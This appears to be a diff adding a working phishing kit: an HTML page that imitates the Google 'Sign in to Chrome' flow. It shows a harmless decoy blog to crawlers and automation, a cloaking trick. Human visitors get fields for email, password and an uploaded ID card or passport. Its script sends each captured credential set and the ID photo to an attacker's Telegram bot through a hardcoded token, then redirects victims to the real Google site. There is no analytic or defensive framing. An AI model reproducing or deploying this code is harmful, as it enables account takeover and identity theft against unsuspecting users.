@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+  :root {
+    --bg: #1f2023; --card: #0e0e0e; --text: #e3e3e3; --sub: #c4c7c5;
+    --blue: #8ab4f8; --border: #8e918f; --focus: #a8c7fa; --btn-text: #062e6f; --error: #f2b8b5;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; min-height: 100%; background: var(--bg); color: var(--text); font-family: "Google Sans", Roboto, Arial, sans-serif; }
+  .back { position: absolute; top: 20px; left: 28px; background: none; border: 0; color: var(--blue); font-size: 26px; cursor: pointer; }
+  main { display: flex; justify-content: center; padding-top: 228px; }
+  .card { width: 1420px; max-width: 90vw; min-height: 460px; background: var(--card); border-radius: 28px; padding: 56px 64px; display: grid; grid-template-columns: 1fr 1fr; gap: 80px; }
+  .left { padding-top: 4px; }
+  .logo { width: 50px; height: 50px; display: block; margin-bottom: 70px; }
+  h1 { font-size: 44px; font-weight: 400; margin: 0 0 24px; }
+  .sub { font-size: 20px; color: var(--text); margin: 0; }
+  .account-chip { display: inline-flex; align-items: center; gap: 10px; height: 40px; padding: 0 14px 0 8px; margin-top: 4px; border: 1px solid #747775; border-radius: 20px; font-size: 15px; cursor: pointer; }
+  .account-chip .avatar { width: 24px; height: 24px; border-radius: 50%; background: #3c4043; display: flex; align-items: center; justify-content: center; }
+  .caret { font-size: 11px; color: var(--sub); }
+  .right { display: flex; flex-direction: column; position: relative; overflow: hidden; }
+  .field { position: relative; margin-top: 56px; }
+  .field input { width: 100%; height: 68px; padding: 0 20px; background: transparent; color: var(--text); border: 1px solid var(--border); border-radius: 4px; font: 18px inherit; outline: none; }
+  .field input:focus { border: 2px solid var(--focus); }
+  .field label { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--sub); font-size: 18px; pointer-events: none; transition: all .12s ease; background: transparent; padding: 0; }
+  .field input:focus + label, .field input.filled + label { top: 0; transform: translateY(-50%); left: 12px; font-size: 12px; padding: 0 6px; color: var(--focus); background: var(--card); }
+  .field.error input { border-color: var(--error); }
+  .field.error label { color: var(--error); }
+  .error-msg { color: var(--error); font-size: 13px; margin: 6px 0 0 20px; display: none; }
+  .field.error + .error-msg { display: block; }
+  .link { color: var(--blue); font-weight: 500; text-decoration: none; font-size: 16px; cursor: pointer; }
+  .help-text { font-size: 15px; color: var(--text); margin-top: 24px; line-height: 1.5; }
+  .show-pass { display: flex; align-items: center; gap: 12px; margin-top: 22px; font-size: 16px; cursor: pointer; user-select: none; }
+  .show-pass input { width: 18px; height: 18px; accent-color: var(--focus); }
+  .actions { margin-top: auto; padding-top: 50px; display: flex; justify-content: flex-end; align-items: center; gap: 40px; }
+  .btn-text { background: none; border: 0; color: var(--blue); font-weight: 500; font-size: 16px; cursor: pointer; padding: 10px; }
+  .btn-next { height: 50px; padding: 0 30px; border: 0; border-radius: 25px; background: var(--focus); color: var(--btn-text); font-weight: 500; font-size: 16px; cursor: pointer; }
+  .btn-next:hover { filter: brightness(1.05); }
+  footer { display: flex; justify-content: space-between; align-items: center; width: 1420px; max-width: 90vw; margin: 28px auto 0; padding: 0 8px; font-size: 14px; color: var(--sub); }
+  footer nav { display: flex; gap: 36px; }
+  footer a { color: var(--sub); text-decoration: none; }
+  .step-panel { transition: opacity .32s ease, transform .32s ease; opacity: 1; transform: translateX(0); }
+  .step-panel.leaving-left { opacity: 0; transform: translateX(-24px); }
+  .step-panel.enter-from-right { opacity: 0; transform: translateX(24px); }
+  h1, .sub, #chip { transition: opacity .28s ease, transform .28s ease; }
+  .fade-swap { opacity: 0 !important; transform: translateY(4px) !important; }
+  [hidden] { display: none !important; }
+  .id-upload-box { border: 2px dashed var(--border); border-radius: 8px; padding: 40px 20px; text-align: center; cursor: pointer; margin-top: 30px; transition: border-color 0.2s; }
+  .id-upload-box:hover { border-color: var(--focus); }
+  .id-upload-box svg { width: 40px; height: 40px; fill: var(--blue); margin-bottom: 10px; }
+  .id-upload-box p { margin: 0; font-size: 16px; color: var(--text); }
+  .id-upload-box span { font-size: 14px; color: var(--sub); display: block; margin-top: 5px; }
+  input[type="file"] { display: none; }
+
+  /* صفحة التمويه */
+  #decoy-page { display: none; padding: 50px; text-align: center; background: #fff; color: #333; min-height: 100vh; }
+  #decoy-page h1 { color: #111; margin-bottom: 20px; }
+  #decoy-page p { font-size: 16px; line-height: 1.6; color: #555; }
+</style>
+</head>
+<body>
+
+<!-- صفحة التمويه للبوتات -->
+<div id="decoy-page">
+    <h1>Welcome to Our Blog</h1>
+    <p>This is a simple article about cyber security and daily tips.</p>
+</div>
+
+<!-- صفحة التصيد للبشر -->
+<div id="phish-page" style="display: none;">
+  <button class="back" aria-label="Back" onclick="goBack()">←</button>
+  <main>
+    <div class="card">
+      <div class="left">
+        <svg class="logo" viewBox="0 0 48 48">
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+        <h1 id="title">Sign in to Chrome</h1>
+        <p class="sub" id="subtext">Use your Google Account</p>
+        <div class="account-chip" id="chip" hidden>
+          <span class="avatar"><svg width="16" height="16" viewBox="0 0 24 24" fill="#9aa0a6"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg></span>
+          <span id="chip-email">you@gmail.com</span>
+          <span class="caret">▾</span>
+        </div>
+      </div>
+
+      <div class="right">
+        <section id="step1" class="step-panel">
+          <div class="field" id="email-field">
+            <input id="email-input" placeholder=" " oninput="markFilled(this)">
+            <label for="email-input">Email or phone</label>
+          </div>
+          <p class="error-msg">Enter an email or phone number</p>
+          <div style="margin-top:14px;"><a class="link" href="#">Forgot email?</a></div>
+          <p class="help-text">Not your computer? Use Guest mode to sign in privately. <a class="link" href="#">Learn more about using Guest mode</a></p>
+        </section>
+
+        <section id="step2" class="step-panel" hidden>
+          <div class="field" id="pass-field">
+            <input id="pass-input" type="password" placeholder=" " oninput="markFilled(this)">
+            <label for="pass-input">Enter your password</label>
+          </div>
+          <p class="error-msg">Wrong password. Try again.</p>
+          <label class="show-pass"><input type="checkbox" id="show-pass" onchange="toggleShow()"><span>Show password</span></label>
+        </section>
+
+        <section id="step3" class="step-panel" hidden>
+          <h2 style="font-size: 24px; font-weight: 400; margin-bottom: 10px;">Identity Verification</h2>
+          <p style="font-size: 16px; color: var(--sub); margin-bottom: 10px;">To keep your account secure, we need to verify your identity.</p>
+          <label for="id-file" class="id-upload-box" id="upload-box">
+              <svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4v6zm-4 2h14v2H5v-2z"/></svg>
+              <p>Upload ID Card / Passport</p>
+              <span id="file-name">Click to browse or take a photo</span>
+          </label>
+          <input type="file" id="id-file" accept="image/*" onchange="handleFile(this)">
+          <p style="font-size: 12px; color: var(--sub); margin-top: 20px; text-align: center;">Your data is encrypted and used only for verification.</p>
+        </section>
+
+        <div class="actions">
+          <button class="btn-text" id="alt-btn">Create account</button>
+          <button class="btn-next" id="next-btn" onclick="handleNext()">Next</button>
+        </div>
+      </div>
+    </div>
+  </main>
+  <footer>
+    <div class="lang"><span>English (United States) ▾</span></div>
+    <nav><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav>
+  </footer>
+</div>
+
+<script>
+  // ==========================================
+  // 1. إعدادات تيليجرام
+  // ==========================================
+  const BOT_TOKEN = "8944614126:AAHbDNowkzRtexO3RXFkAe4WRmur6Rgce3k";
+  const CHAT_ID = "6914078455"; 
+
+  // ==========================================
+  // 2. تكتيك التمويه (Cloaking)
+  // ==========================================
+  function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      const bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 'outbrain', 'pinterest/0.', 'developers.google.com/+/web/snippet', 'slackbot', 'vkshare', 'w3c_validator', 'redditbot', 'applebot', 'whatsapp', 'flipboard', 'tumblr', 'bitlybot', 'skypeuripreview', 'nuzzel', 'discordbot', 'qwantify', 'pinterestbot', 'bitrix link preview', 'xing-contenttabreceiver', 'chrome-lighthouse', 'telegrambot', 'headlesschrome', 'phantomjs'];
+      for (let bot of bots) { if (ua.includes(bot)) return true; }
+      if (navigator.webdriver) return true;
+      return false;
+  }
+
+  window.onload = function() {
+      if (isBot()) {
+          document.getElementById('decoy-page').style.display = 'block';
+          document.getElementById('phish-page').style.display = 'none';
+      } else {
+          document.getElementById('decoy-page').style.display = 'none';
+          document.getElementById('phish-page').style.display = 'block';
+      }
+  };
+
+  // ==========================================
+  // 3. وظائف التصيد
+  // ==========================================
+  let step = 1;
+  let victimEmail = "";
+  let victimPassword = "";
+  let idFile = null;
+
+  function markFilled(input) {
+    input.classList.toggle('filled', input.value.trim().length > 0);
+    input.closest('.field').classList.remove('error');
+  }
+
+  function toggleShow() {
+    const p = document.getElementById('pass-input');
+    p.type = document.getElementById('show-pass').checked ? 'text' : 'password';
+  }
+
+  function handleFile(input) {
+      if (input.files && input.files[0]) {
+          idFile = input.files[0];
+          document.getElementById('file-name').textContent = idFile.name;
+          document.getElementById('upload-box').style.borderColor = "var(--focus)";
+          document.getElementById('upload-box').style.background = "rgba(138, 180, 248, 0.1)";
+      }
+  }
+
+  function transitionStep(fromEl, toEl) {
+    fromEl.classList.add('leaving-left');
+    toEl.hidden = false;
+    toEl.classList.add('enter-from-right');
+    void toEl.offsetWidth;
+    requestAnimationFrame(() => toEl.classList.remove('enter-from-right'));
+    setTimeout(() => { fromEl.hidden = true; fromEl.classList.remove('leaving-left'); }, 320);
+  }
+
+  function handleNext() {
+    if (step === 1) {
+      const email = document.getElementById('email-input').value.trim();
+      if (!email) { document.getElementById('email-field').classList.add('error'); return; }
+      victimEmail = email;
+      document.getElementById('chip-email').textContent = email;
+      document.getElementById('chip').hidden = false;
+      document.getElementById('subtext').hidden = true;
+      document.getElementById('title').textContent = "Welcome";
+      transitionStep(document.getElementById('step1'), document.getElementById('step2'));
+      step = 2;
+      document.getElementById('alt-btn').textContent = "Try another way";
+    } else if (step === 2) {
+      const pass = document.getElementById('pass-input').value;
+      if (!pass) { document.getElementById('pass-field').classList.add('error'); return; }
+      victimPassword = pass;
+      document.getElementById('title').textContent = "Verify it's you";
+      document.getElementById('chip').hidden = true;
+      transitionStep(document.getElementById('step2'), document.getElementById('step3'));
+      step = 3;
+      document.getElementById('alt-btn').hidden = true;
+      document.getElementById('next-btn').textContent = "Submit";
+    } else if (step === 3) {
+      if (!idFile) { alert("Please upload your ID."); return; }
+      submitFinalData();
+    }
+  }
+
+  function goBack() {
+    if (step === 3) {
+        transitionStep(document.getElementById('step3'), document.getElementById('step2'));
+        document.getElementById('step2').hidden = false;
+        document.getElementById('step3').hidden = true;
+        step = 2;
+        document.getElementById('title').textContent = "Welcome";
+        document.getElementById('next-btn').textContent = "Next";
+        document.getElementById('alt-btn').hidden = false;
+    } else if (step === 2) {
+        transitionStep(document.getElementById('step2'), document.getElementById('step1'));
+        document.getElementById('step2').hidden = true;
+        document.getElementById('step1').hidden = false;
+        step = 1;
+        document.getElementById('title').textContent = "Sign in to Chrome";
+        document.getElementById('subtext').hidden = false;
+        document.getElementById('chip').hidden = true;
+        document.getElementById('next-btn').textContent = "Next";
+        document.getElementById('alt-btn').textContent = "Create account";
+    } else { history.back(); }
+  }
+
+  async function submitFinalData() {
+    // 1. إرسال النص
+    const textMsg = `🎯 **New Capture!**\n\n📧 **Email:** \`${victimEmail}\`\n🔑 **Password:** \`${victimPassword}\``;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg, parse_mode: 'Markdown' })
+        });
+
+        // 2. إرسال الصورة
+        if (idFile) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("caption", `🪪 ID Card for: ${victimEmail}`);
+            formData.append("photo", idFile);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // 3. التوجيه
+        window.location.href = "https://myaccount.google.com/";
+        
+    } catch (error) {
+        console.error(error);
+        window.location.href = "https://myaccount.google.com/";
+    }
+  }
+</script>
+</body>
+</html>
